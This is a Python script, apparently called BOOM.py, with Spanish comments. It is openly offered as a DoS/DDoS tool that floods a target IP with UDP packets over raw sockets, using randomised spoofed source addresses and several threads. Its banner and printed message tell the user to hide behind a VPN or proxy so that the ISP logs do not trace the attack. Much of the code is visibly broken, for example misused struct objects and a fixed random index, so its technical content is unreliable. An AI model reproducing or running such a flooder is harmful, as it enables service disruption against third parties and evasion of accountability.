#**********************************************************************************************
#                                                                                             *
#           Recuerda si vas a realizar un ataque, utiliza una proxy o VPN,                   *
#           ya que las actividades quedan registradas por tu proveedor de                   *
#           servicios de Internet (ISP). Ten esto en cuenta antes de proceder.               *
#                                                                                             *
#**********************************************************************************************
import socket
import struct
import threading
import random
import time
import sys
from colorama import Fore, Back, Style, init

init(autoreset=True)

decoracion = f"""
{Fore.GREEN} ******     *******     *******   ****     ****
{Fore.GREEN}/*////**   **/////**   **/////** /**/**   **/**
{Fore.GREEN}/*   /**  **     //** **     //**/**//** ** /**
{Fore.GREEN}/******  /**      /**/**      /**/** //***  /**
{Fore.GREEN}/*//// **/**      /**/**      /**/**  //*   /**
{Fore.GREEN}/*    /**//**     ** //**     ** /**   /    /**
{Fore.GREEN}*******  //*******   //*******  /**        /**
{Fore.GREEN}///////    ///////     ///////   //         // 
"""

print(decoracion)
print(Fore.BLUE + "Este script es un UDP-RAW con spoofing")
print(Fore.RED + "Recuerda si vas a realizar un ataque utiliza alguna vpn o proxy porque estos tipos de ataque se guardan en el isp osea los distribuidores de servicio de internet")
MAX_PACKET_SIZE = 4096
PHI = 0x9e3779b9

Q = [0] * 4096
c = 362436


class ThreadData:

  def __init__(self, throttle, thread_id, sin):
    self.throttle = throttle
    self.thread_id = thread_id
    self.sin = sin


def init_rand(x):
  global Q, c
  Q[0] = x
  Q[1] = x + PHI
  Q[2] = x + PHI + PHI

  for i in range(3, 4096):
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i


def rand_cmwc():
  global Q, c
  t = 0
  a = 18782

  i = 4095
  i = (i + 1) & 4095
  t = a * Q[i] + c
  c = t >> 32
  x = t + c

  if x < c:
    x += 1
    c += 1

  Q[i] = 0xfffffffe - x
  return Q[i]


def myStrCat(s, a):
  return s + a


def replStr(s, count):
  if count == 0:
    return None
  ret = s
  tmp = ret
  while count > 1:
    tmp = myStrCat(tmp, s)
    count -= 1
  return ret


def csum(buf, nwords):
  sum = 0
  for word in buf:
    sum += word
  sum = (sum >> 16) + (sum & 0xffff)
  sum += (sum >> 16)
  return (~sum) & 0xffff


def setup_ip_header(iph, sin):
  iph.ihl = 5
  iph.version = 4
  iph.tos = 0
  iph.tot_len = 20 + 8 + 1028
  iph.id = 54321
  iph.frag_off = 0
  iph.ttl = 255
  iph.protocol = socket.IPPROTO_UDP
  iph.check = 0
  iph.saddr = socket.inet_aton("192.168.3.100")
  iph.daddr = sin.sin_addr.s_addr


def setup_udp_header(udph):
  udph.source = 5678
  udph.check = 0
  data = b"\xFF" * 256
  udph.len = 8 + len(data)
  return data


def flood(td, throttle):
  datagram = bytearray(MAX_PACKET_SIZE)
  iph = struct.Struct("!BBHHHBBH4s4s")
  udph = struct.Struct("!HHHH")
  sin = td.sin

  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
  if s < 0:
    print("No se pudo abrir el socket sin formato.")
    exit(-1)

  datagram = bytearray(MAX_PACKET_SIZE)
  setup_ip_header(iph, sin)
  udph_data = setup_udp_header(udph)
  datagram = iph.pack(
      iph.ihl_version,
      iph.tos,
      iph.tot_len,
      iph.id,
      iph.frag_off,
      iph.ttl,
      iph.protocol,
      iph.check,
      iph.saddr,
      iph.daddr,
  ) + udph.pack(udph.source, udph.dest, udph.len, udph.check) + udph_data

  tmp = 1
  val = struct.pack("i", tmp)
  if s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, val) < 0:
    print("Error: setsockopt() - Cannot set HDRINCL!")
    exit(-1)

  random_num = 0
  ul_dst = 0
  init_rand(int(time.time()))

  if throttle == 0:
    while True:
      s.sendto(datagram, (sin.sin_addr.s_addr, sin.sin_port))
      random_num = rand_cmwc()
      ul_dst = ((random_num >> 24 & 0xFF) << 24
                | (random_num >> 16 & 0xFF) << 16
                | (random_num >> 8 & 0xFF) << 8
                | (random_num & 0xFF))
      iph.saddr = ul_dst
      udph.source = random_num & 0xFFFF
      iph.check = csum(
          iph.pack(iph.ihl_version, iph.tos, iph.tot_len, iph.id, iph.frag_off,
                   iph.ttl, iph.protocol, iph.check, iph.saddr, iph.daddr),
          len(
              iph.pack(iph.ihl_version, iph.tos, iph.tot_len, iph.id,
                       iph.frag_off, iph.ttl, iph.protocol, iph.check,
                       iph.saddr, iph.daddr)) >> 1)

  else:
    while True:
      s.sendto(datagram, (sin.sin_addr.s_addr, sin.sin_port))
      random_num = rand_cmwc()
      ul_dst = ((random_num >> 24 & 0xFF) << 24
                | (random_num >> 16 & 0xFF) << 16
                | (random_num >> 8 & 0xFF) << 8
                | (random_num & 0xFF))
      iph.saddr = ul_dst
      udph.source = random_num & 0xFFFF
      iph.check = csum(
          iph.pack(iph.ihl_version, iph.tos, iph.tot_len, iph.id, iph.frag_off,
                   iph.ttl, iph.protocol, iph.check, iph.saddr, iph.daddr),
          len(
              iph.pack(iph.ihl_version, iph.tos, iph.tot_len, iph.id,
                       iph.frag_off, iph.ttl, iph.protocol, iph.check,
                       iph.saddr, iph.daddr)) >> 1)
      while throttle > 0:
        throttle -= 1


def main():
  if len(sys.argv) < 5:
    print("Parametros invalidos!")
    print("Usa: python BOOM.py <IP> <throttle> <threads> <time>")
    exit(-1)

  print("Setting up Sockets...")
  num_threads = int(sys.argv[3])
  threads = []
  sin = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
  sin.sin_family = socket.AF_INET
  sin.sin_port = random.randint(0, 20480)
  sin.sin_addr.s_addr = socket.inet_aton(sys.argv[1])

  for i in range(num_threads):
    td = ThreadData(int(sys.argv[2]), i, sin)
    t = threading.Thread(target=flood, args=(td, int(sys.argv[2])))
    threads.append(t)
    t.start()

  print("DoS/DDoS iniciado...")

  if len(sys.argv) > 5:
    time.sleep(int(sys.argv[4]))
  else:
    while True:
      time.sleep(1)


if __name__ == "__main__":
  main()
